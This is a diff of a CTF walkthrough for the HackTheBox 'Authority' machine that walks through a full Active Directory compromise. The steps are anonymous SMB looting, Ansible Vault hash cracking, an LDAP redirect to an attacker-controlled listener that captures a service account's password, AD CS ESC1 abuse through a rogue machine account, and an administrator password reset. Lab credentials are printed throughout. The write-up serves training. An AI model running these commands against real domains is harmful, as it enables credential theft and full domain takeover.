@@ -144,10 +144,12 @@ grep -E '^[0-9]+/tcp[[:space:]]+open' authority_initial.nmap | cut -d '/' -f1 | 
 <br></br>
 
 **The "Department Shares" directory has restricted access. Without the appropriate user credentials, we cannot access this share. Therefore, we can move on to the next one and potentially revisit it later once we have obtained valid credentials.**
+
 ```
 ┌──(kali㉿kali)-[~/htb/authority]
 └─$ smbclient -N //10.129.229.56/"Department Shares"
 ```
+
 ![[Pasted image 20261114201122.png]]
 
 ---
@@ -157,10 +159,12 @@ grep -E '^[0-9]+/tcp[[:space:]]+open' authority_initial.nmap | cut -d '/' -f1 | 
 <br></br>
 
 **By connecting to the `Development` share using `smbclient` without providing credentials, we can confirm that anonymous access is permitted.**
+
 ```
 ┌──(kali㉿kali)-[~/htb/authority]
 └─$ smbclient -N //10.129.229.56/Development
 ```
+
 ![[Pasted image 20261114201250.png]]
 
 ```
@@ -191,6 +195,7 @@ smb: \Automation\Ansible\> ls
 <br></br>
 
 **To download files and directories recursively, we enable `recurse` and disable the interactive prompt using `prompt`. We can then use `mget` to download the entire `Ansible` directory and its contents.**
+
 ```
 smb: \Automation\> recurse ON
 smb: \Automation\> prompt OFF
@@ -276,7 +281,7 @@ cat PWM/defaults/main.yml
 
 ---
 
-> [!summary] Planning the Next Steps
+> [!summary] Plan the Next Steps
 > The official Ansible documentation provides instructions on how to decrypt these hashes. It also includes an example of the required hash format as well as a password is being required. To match this format, we first need to convert the extracted hashes using John the Ripper and than crack the hash to get it's password using a password-cracking tool like Hashcat. 
 
 ---
@@ -315,9 +320,11 @@ EOF
 **At this stage, we use `ansible2john` to convert the Ansible Vault hash into a format that John the Ripper and Hashcat can process. Ansible Vault hashes use the `$ANSIBLE_VAULT;1.1;AES256` header, which identifies the encrypted data and its format.**
 
 - **First confirm there is a module for Ansible in `2john` by simply using the `locate` command with wildcards at the beginning and the end to make sure we get every file:**
+
 ```
 locate *2john*
 ```
+
 ![[Pasted image 20261115190112.png]]
 
 **The command for `ansible2john` looks like this:**
@@ -367,7 +374,8 @@ $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e0
 
 <br></br>
 
-**The official documentation mentions how to decrypt the hash. To do this, we need the password we cracked using Hashcat. Keep in mind do repeat this step for all three `.txt` files.**
+**The official documentation mentions how to decrypt the hash. To do this, we need the password we cracked using Hashcat. We repeat this step for all three `.txt` files.**
+
 ```
 ┌──(kali㉿kali)-[~/htb/authority/Ansible] 
 └─$ ansible-vault decrypt pwm_admin_login.txt Vault password: Decryption successful
@@ -390,7 +398,7 @@ DevT3st@123
 
 ```
 
-**Now that we've got two passwords and one username we need to find a service to enter these credentials and hopefully get access. To find our next attack vector I will go back to `authority_detailed_scan.nmap` and list all interesting services.** 
+**Now we need to find a service to enter these credentials. To find our next attack vector I will go back to `authority_detailed_scan.nmap` and list interesting services.** 
 
 > [!example]- Services
 > | Service                                   | Thoughts                                                                                                                          |
@@ -406,28 +414,32 @@ DevT3st@123
 
 <br></br>
 
-**Visiting https://10.129.229.56:8443/ - Apache Tomcat and navigating to "Configuration Editor".** 
+**Go to https://10.129.229.56:8443/ - Apache Tomcat and navigating to "Configuration Editor".** 
 **The password `pWm_@dm!N_!23` gives access to the Config Editor.** 
 
 ![[Pasted image 20261116175026.png|394]]
 
 **Navigating the LDAP directory path `LDAP -> LDAP Directories -> default -> Connection`.** 
-**The page is used to configure the application's connection to the LDAP server. We are able to add a new value und delete the existing one. From out Nmap scan we know the LDAP service is running on port 389 So lets add `ldap://<attacker_IP>:389` (We do this because LDAPS (port 636) uses TLS encryption and LDAP is not encrypted).** 
+**The page is used to configure the application's connection to the LDAP server. We are able to add a new value und delete the existing one. 
+We know that the LDAP service is running on port 389 this is important because LDAP is not encrypted. Add `ldap://<attacker_IP>:389` to the LDAP URLs.** 
 ![[Pasted image 20261116180626.png]]
 
-**Before we click on `Test LDAP Profile` run Netcat:** 
+**Before we run `Test LDAP Profile`, start Netcat listener:** 
 ```
 ┌──(kali㉿kali)-[~/htb/authority]
 └─$ nc -lvnp 389
 ```
 
-| Option | Description                       |
+
+> [!NOTE]- Netcat-Options
+> | Option | Description                       |
 | ------ | --------------------------------- |
 | **-l** | listen mode, for inbound connects |
 | **-v** | verbose                           |
 | **-n** | numeric-only IP addresses, no DNS |
 | **-p** | local port number                 |
-- **Afterwards run the LDAP test.**
+
+- **Then run `Test LDAP Profile`.**
 
 ![[Pasted image 20261115213928.png]]
 - **we successfully grabbed the ldap banner.**
@@ -453,45 +465,51 @@ DevT3st@123
 nxc ldap 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d authority.htb --dns-server 10.129.229.56 --bloodhound -c All
 ```
 
-![[Pasted image 20261116185440.png]]
-
 ![[Pasted image 20261115214436.png]]
 
 
 > [!info] Find an Attack Path 
-> Since `SVC_LDAP` is a member of the `Domain Users` group, and `Domain Users` has Enroll rights on the `ClientAuth` certificate template, `SVC_LDAP` can request a certificate from this template. This is a classic ESC (Enrollee-Supplies-Subject / misconfigured template) scenario leveraged via AD CS.
+> Since `SVC_LDAP` is a member of the `Domain Users` group, and `Domain Users` has Enroll rights on the `ClientAuth` certificate template, `SVC_LDAP` can request a certificate from this template. However, enrollment rights alone are not a vulnerability. To find out whether the template is actually exploitable, we need more information about the domain, and `certipy-ad` is very handy for this kind of enumeration
 
 <br></br>
 
 <span style="color:rgb(89, 84, 84)"><h1 style="text-align: center; font-size: 2em;"></span>
-<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">EXPLOITATION</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
+<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">Exploitation</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
 <span style="color:rgb(89, 84, 84)"></h1></span>
 
 <br></br>
 
-**check for vulnerabilities with certipy**
+**We can scan for known vulnerabilities with the following `certipy-ad` command.**
+
 ```
-┌──(kali㉿kali)-[~/htb/authority/Ansible]
-└─$ certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
+certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
 ```
+
+**The output gives us a lot of useful information like the CA-Name, DNS Name (we can add this one to our host file using e.g. `sudo nano /etc/hosts`) and the Template Name.** 
+**This will be important for commands we will use in the following steps.**
 
 ![[Pasted image 20261115222108.png]]
 
 ![[Pasted image 20261115223949.png]]
 
 ![[Pasted image 20261116213744.png]]
-- **ESC1 only possible with Domain Computer**
+**ESC1 is only possible from a Domain Computer.**
 
+It's possible to give domain users the permission to create domain computers, we can check if the user `svc_ldap` is permitted to do so. The `netexec` command below will output how many we can add to the domain.
 
 ```
-┌──(kali㉿kali)-[~/htb/authority/Ansible]
-└─$ netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
+netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
 ```
-- **check if we can create a domain computer**
-- **`-M maq`: is the Module for `MaschineAccountQuota`, the command `nxc ldap -L` lists the LDAP-Modules.**
+- **`-M maq`: is the Module for `MaschineAccountQuota`**
 
-![[Pasted image 20261115224416.png]]
-- **`MachineAccountQuota: 10` The number of computer accounts that a user is allowed to create in a domain.**
+![[pasted-image-computerquata10.png]]
+
+<br></br>
+
+---
+
+> [!tip] Tip
+> The command `nxc ldap -L` lists available LDAP-Modules.
 
 ---
 
@@ -500,8 +518,7 @@ nxc ldap 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d authority.htb --
 <br></br>
 
 ```
-┌──(kali㉿kali)-[~/htb/authority]
-└─$ impacket-addcomputer -computer-name 'PENTEST$' -computer-pass 'S3cUrP455w0rD!' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
+impacket-addcomputer -computer-name 'PENTEST$' -computer-pass 'S3cUrP455w0rD!' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
 
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -511,8 +528,8 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 **The command requests a certificate from the `AUTHORITY-CA` using the `CorpVPN` template, impersonating the Administrator by setting the UPN to `administrator@authority.htb`.**
 ```
-┌──(kali㉿kali)-[~/htb/authority]
-└─$ certipy-ad req -username 'PENTEST$' -password 'S3cUrP455w0rD!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
+certipy-ad req -username 'PENTEST$' -password 'S3cUrP455w0rD!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
+
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -527,35 +544,35 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator_authority.pfx'
 ```
 
-**We can use this certificate to authenticate as administrator to change administrators password we can use `-ldap-shell` which starts an interactive shell.**
+**We can use this certificate to authenticate as administrator to change the users password, to do so we can use `-ldap-shell` which starts an interactive shell.**
 ```
 certipy-ad auth -ldap-shell -pfx administrator_authority.pfx -dc-ip 10.129.229.56 -username administrator -domain authority.htb
 ```
 
 **The `help` command lists commands, there sytax and a short description.** 
 **The syntax to change the password would be:**
+
 ```
-change_password administrator <new_password>
+change_password administrator N3wP455w0rD
 ```
 
-![[Pasted image 20261116223857.png]]
+![[Pasted image 20261116223447.png]]
 
-**As we can see in the image above the password was changed successfully, now we can to login to the domain as administrator.**
+**The password was changed successfully, now we can login to the domain as administrator.**
 
 <br></br>
 
 <span style="color:rgb(89, 84, 84)"><h1 style="text-align: center; font-size: 2em;"></span>
-<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">ROOT ACCESS</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
+<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">Post-Exploitation</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
 <span style="color:rgb(89, 84, 84)"></h1></span>
 
 <br></br>
 
-Looking into the Nmap scan once more port `5985` is open by default the service running here is `WinRM HTTP`. Making use of `evil-winrm` we are connecting remote to the domain logging in as administrator. 
+**Looking into the Nmap scan once more port `5985` is open by default the service running here is `WinRM HTTP`. Making use of `evil-winrm` we are connecting remote to the domain logging in as administrator.** 
 ```
 evil-winrm -i 10.129.229.56 -u administrator -p 'N3wP455w0rD'
 ```
 
 ![[Pasted image 20261116223739.png]]
 
----
-
+***And that's it. In a real-world engagement, we would move laterally, gather information about the customer, and possibly deploy a backdoor. In a CTF, however, all we're after are the user and root flags. I won't explain how to find them, since they aren't hard to find, and I don't want to give the impression that we do all of this just for a flag. The knowledge we gain from this kind of gamified learning matters far more than any ranking or level we might reach.***
